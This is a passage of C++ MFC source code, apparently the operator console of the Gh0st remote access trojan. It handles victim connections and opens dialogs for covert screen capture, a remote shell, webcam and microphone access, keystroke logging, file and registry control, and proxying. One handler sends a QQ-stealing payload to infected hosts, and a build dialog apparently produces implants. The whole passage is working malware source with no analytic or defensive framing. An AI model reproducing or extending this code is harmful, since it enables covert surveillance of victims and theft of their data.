                        bIsOk = true;
                        strOSCount = pView->m_pListCtrl->GetItemText( i, 5 );
                        if ( strOSCount.Find(_T("XP")) != -1 ) {
                            g_pFrame->nOSCount[2]--;
                        } else if ( strOSCount.Find(_T("Win 7")) != -1 ) {
                            g_pFrame->nOSCount[6]--;
                        } else if ( strOSCount.Find(_T("2003")) != -1 ) {
                            g_pFrame->nOSCount[3]--;
                        } else if ( strOSCount.Find(_T("Win 8")) != -1 ) {
                            g_pFrame->nOSCount[7]--;
                        } else if ( strOSCount.Find(_T("2008")) != -1 ) {
                            g_pFrame->nOSCount[5]--;
                        } else if ( strOSCount.Find(_T("Vista")) != -1 ) {
                            g_pFrame->nOSCount[4]--;
                        } else if ( strOSCount.Find(_T("2012")) != -1 ) {
                            g_pFrame->nOSCount[8]--;
                        } else if ( strOSCount.Find(_T("2000")) != -1 ) {
                            g_pFrame->nOSCount[1]--;
                        } else if ( strOSCount.Find(_T("NT")) != -1 ) {
                            g_pFrame->nOSCount[0]--;
                        } else if ( strOSCount.Find(_T("Win10")) != -1) {
                            g_pFrame->nOSCount[9]--;
                        }

                        pView->m_pListCtrl->DeleteItem(i);

                        if (!((CGh0stApp *)AfxGetApp())->m_bIsWarning_Tone) {
                            PlaySound(MAKEINTRESOURCE(IDR_WAVE_OFFLINE),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
                        }

                        break;
                    }
                }

                if(bIsOk == false)
                    TRACE("没有找到。");
            }
        } catch(...) {
            TRACE("下线失败");
        }
    }

    // 更新当前连接总数
    g_pTabView->UpDateNumber();
    ShowConnectionsNumber();

    return 0;
}

LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;

    CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
    // 设置父窗口为卓面
    dlg->Create(IDD_DIALOG_SCREENSPY, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = SCREENSPY_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;

    CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
    // 设置父窗口为卓面
    dlg->Create(IDD_DIALOG_FILEMANAGER, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = FILEMANAGER_DLG;
    pContext->m_Dialog[1] = (int)dlg;

    return 0;
}

LRESULT CMainFrame::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);

    // 设置父窗口为卓面
    dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = SHELL_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;
    CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
    // 设置父窗口为卓面
    dlg->Create(IDD_DIALOG_WEBCAM, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = WEBCAM_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenServiceDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;
    CServiceDlg	*dlg = new CServiceDlg(this, m_iocpServer, pContext);
    // 设置父窗口为卓面
    dlg->Create(IDD_DIALOG_SERVICE, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = SERVICE_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;
    CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
    // 设置父窗口为卓面
    dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = AUDIO_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

    // 设置父窗口为卓面
    dlg->Create(IDD_DIALOG_KEYBOARD, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = KEYBOARD_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenChatDialog(WPARAM wParam, LPARAM lParam) // 剪切板
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CMydat	*dlg = new CMydat(this, m_iocpServer, pContext);

    // 设置父窗口为卓面
    dlg->Create(IDD_CHAT, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = GETDAT_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnModifyList(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    if (pContext == NULL)
        return 0;

    CPcView* pView = NULL;
    pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));

    int nCount = pView->m_pListCtrl->GetItemCount();

    for (int i=0; i < nCount; i++) {
        if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i)) {
            CString str, strTemp;

            str = pView->m_pListCtrl->GetItemText(i,3);
            int n = str.Find("*");
            if (n == 0) {
                str = str.Right(str.GetLength() - 1);
            }
            strTemp = "*";
            strTemp += str;

            pView->m_pListCtrl->SetItemText(i,3,strTemp);

            break;
        }
    }

    return 0;
}


LRESULT CMainFrame::OnOpenTextChatDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CTextChatDlg	*dlg = new CTextChatDlg(this, m_iocpServer, pContext);

    CInputDialog Indlg;
    Indlg.Init("请输入聊天昵称", _T("点取消默认昵称为(外星人)ET:"), this);
    if (Indlg.DoModal() != IDOK)
        dlg->strName = "ET:\r\n";
    else
        dlg->strName.Format("%s:\r\n",Indlg.m_str.GetBuffer(0));

    // 设置父窗口为卓面
    dlg->Create(IDD_DIALOG_TEXTCHAT, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = CHAT_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);

    // 设置父窗口为卓面
    dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = SYSTEM_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)    //注册表
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CRegeditDlg	*dlg = new CRegeditDlg(this, m_iocpServer, pContext);
    //设置父窗口为卓面
    dlg->Create(IDD_DIALOG_REGEDIT, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = REGEDIT_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenQQBoxDialog(WPARAM wParam, LPARAM lParam)    //注册表
{
    ClientContext	*pContext = (ClientContext *)lParam;

    CString str = pContext->m_DeCompressionBuffer.GetBuffer(1);

    CSelectQQ dlg(str);
    if (dlg.DoModal() == IDOK) {
        PDllCode lpqqPacket = new DllCode(COMMAND_QQBOX, GETQQMyFileBuf, sizeof(GETQQMyFileBuf), 100);
        m_iocpServer->Send(pContext, lpqqPacket->Code(), lpqqPacket->Length());
        SAFE_DELETE(lpqqPacket);
    }
    return 0;
}


LRESULT CMainFrame::OnOpenBuildDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;

    CBuild dlg;
    dlg.DoModal();

    return 0;
}

LRESULT CMainFrame::OnOpenProxyMapDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CProxyMapDlg	*dlg = new CProxyMapDlg(this, m_iocpServer, pContext);

    // 设置父窗口为卓面
    dlg->Create(IDD_DIALOG_PROXY_MAP, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = PROXYMAP_DLG;
    pContext->m_Dialog[1] = (int)dlg;

    return 0;
}

void CMainFrame::OnTimer(UINT nIDEvent)
{
    // TODO: Add your message handler code here and/or call default
    switch(nIDEvent) {
    case 0: {
        CString str1,str2;
        str1.Format("发送: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024);
        str2.Format("接收: %.2f kb/s", (float)m_iocpServer->m_nRecvKbps / 1024);
        m_wndStatusBar.SetPaneText(1, str1);
        m_wndStatusBar.SetPaneText(2, str2);
        m_iocpServer->m_nSendKbps = 0;
        m_iocpServer->m_nRecvKbps = 0;
    }
    break;
    default:
        break;
    }

    CXTPFrameWnd::OnTimer(nIDEvent);
}

void CMainFrame::OnMenuitemUpdateIp()
{
    CUpdateDlg dlg;
    dlg.DoModal();
}

LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
    if (wParam == XTP_DPN_SHOWWINDOW) {
        // get a pointer to the docking pane being shown.
        CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
        if (!pPane->IsValid()) {
            CWnd* pWnd = NULL;
            if (m_mapPanes.Lookup(pPane->GetID(), pWnd)) {
                pPane->Attach(pWnd);
            }
        }

        return TRUE; // handled
    }
    return FALSE;
}
